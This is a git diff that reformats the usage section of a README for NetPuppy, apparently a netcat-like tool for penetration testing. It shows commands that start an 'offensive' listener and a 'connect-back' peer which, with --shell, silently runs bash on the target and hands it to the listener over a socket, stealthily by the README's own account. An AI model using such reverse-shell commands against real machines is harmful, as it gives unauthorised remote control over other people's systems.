@@ -41,34 +41,41 @@ The 'connect-back' peer starts w/ a client-like relationship to the offense peer
 - `--shell` tell NetPuppy to start a bash shell on the client peer which will take socket input as stdin and output stdout/stderr back into the socket.
 ## Examples:
 ### Offense Peer:
+```bash
+go run main.go -l -p 44444
 ```
-$ go run main.go -l -p 44444
-
-... <banner>          
-
-    *sneef sneef*
-   .-.
-  / (_          |Host:  0.0.0.0
- ( "  6\___o    |RPort: 44444
- /  (  ___/     |LPort: 44444
-/     /  U      |Mode:  Offensive Server
+#### Output 
 ```
+#... <banner>          
+
+#    *sneef sneef*
+#   .-.
+#  / (_          |Host:  0.0.0.0
+# ( "  6\___o    |RPort: 44444
+# /  (  ___/     |LPort: 44444
+#/     /  U      |Mode:  Offensive Server
+```
+
 ### Connect-Back Peer:
+```bash
+go run main.go -H 0:0:0:0:0:0:0:1 -p 44444
 ```
-$ go run main.go -H 0:0:0:0:0:0:0:1 -p 44444
 
-...<banner>
-
-        bork!
-     __  /     |Host:  0:0:0:0:0:0:0:1
-(___()'';      |RPort: 44444
-/ )   /'       |LPort: 60804
-/\'--/\        |Mode:  Client
+#### Output
 ```
+#...<banner>
+
+#        bork!
+#     __  /     |Host:  0:0:0:0:0:0:0:1
+#(___()'';      |RPort: 44444
+#/ )   /'       |LPort: 60804
+#/\'--/\        |Mode:  Client
+```
+
 ### Connect-Back Peer w/ shell:
 The Connect-Back peer will **NOT** print any output to the terminal when the `--shell` flag is given (we're trying to be sneaky). Any errors will be sent through the socket to the Offensive peer (unless the socket hasn't been connected yet, in that case NP will just exit without printing anything on the target machine).
-```
-$ go run main.go -H 127.0.0.1 -p 44444 --shell
+```bash
+go run main.go -H 127.0.0.1 -p 44444 --shell
 ```
 
 ## Goals
